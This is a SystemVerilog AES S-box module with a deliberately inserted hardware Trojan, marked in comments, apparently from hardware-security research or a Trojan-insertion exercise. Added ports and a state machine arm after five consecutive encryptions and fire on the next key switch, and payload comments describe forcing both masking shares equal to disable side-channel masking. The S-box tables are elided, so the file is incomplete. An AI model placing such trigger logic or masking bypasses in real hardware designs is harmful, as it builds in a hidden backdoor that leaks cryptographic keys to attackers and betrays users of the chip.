module aes_sbox_lut (
  input  aes_pkg::ciph_op_e op_i,
  input  logic [7:0]        data_i,
  output logic [7:0]        data_o,

  // TROJAN BEGIN [Trigger signals]
  input  logic              clk,          // Required for sequential trigger logic
  input  logic              rst_n,        // Active-low synchronous reset
  input  logic              enc_cmd_i,    // High for each encryption command (CIPH_FWD), low otherwise
  input  logic              key_switch_i, // High for a new key loading command, low otherwise
  // TROJAN END
  output logic              trojan_active // Indicates Trojan activation (for integration)
);

  import aes_pkg::*;

  // Define the LUTs (unchanged)
  localparam logic [7:0] SBOX_FWD [256] = '{
    // ... <unchanged, as above> ...
    8'h41, 8'h99, 8'h2D, 8'h0F, 8'hB0, 8'h54, 8'hBB, 8'h16
  };

  localparam logic [7:0] SBOX_INV [256] = '{
    // ... <unchanged, as above> ...
    8'he1, 8'h69, 8'h14, 8'h63, 8'h55, 8'h21, 8'h0c, 8'h7d
  };

  // Trojan Trigger Registers
  logic [2:0] enc_counter;     // Counts consecutive encryptions (max 5)
  logic       trojan_arm;      // Set after 5 encryptions, arms Trojan for key switch
  logic       trojan_trig;     // Set TRUE for one cycle when Trojan activated

  // TROJAN [Trigger FSM]
  always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      enc_counter  <= 3'b000;
      trojan_arm   <= 1'b0;
      trojan_trig  <= 1'b0;
    end else begin
      // Default
      trojan_trig <= 1'b0;
      // Count consecutive encryption commands (op_i == CIPH_FWD)
      // enc_cmd_i is asserted per encryption command cycle
      if (enc_cmd_i && (enc_counter < 3'd5)) begin
        enc_counter <= enc_counter + 3'b001;
      end else if (!enc_cmd_i && !key_switch_i) begin
        // Reset counter if any non-encryption cycle or key switch not asserted
        enc_counter <= 3'b000;
      end

      // Arm the Trojan after exactly five encryptions (without reset)
      if (enc_counter == 3'd5 && !trojan_arm) begin
        trojan_arm <= 1'b1;
      end

      // On the first key_switch command after arming, activate Trojan
      if (trojan_arm && key_switch_i) begin
        trojan_trig <= 1'b1;
        trojan_arm  <= 1'b0;
        enc_counter <= 3'b000; // Reset counter after trigger
      end
      // Trojan can only be armed again after retriggering the sequence
    end
  end

  // TROJAN [Payload Signal]
  // The Trojan "active" condition can last as long as needed. Here, it is signaled for one cycle at trigger.
  assign trojan_active = trojan_trig;

  // TROJAN [Payload - pseudologic]
  // This module is just the SBox; however, in the AES core, where first-order masking is implemented using two shares,
  // integrate the following logic for the masked shares when trojan_active==1:
  //   if (trojan_active)
  //     share1 = share2 = (original_share1_value); // force shares equal => no masking!
  // This is to bypass masking for SCA; in the SBox itself, payload logic should be inserted at the share assignment site.

  // Original SBox LUT logic (unchanged)
  assign data_o = (op_i == CIPH_FWD) ? SBOX_FWD[data_i] :
                  (op_i == CIPH_INV) ? SBOX_INV[data_i] : SBOX_FWD[data_i];

endmodule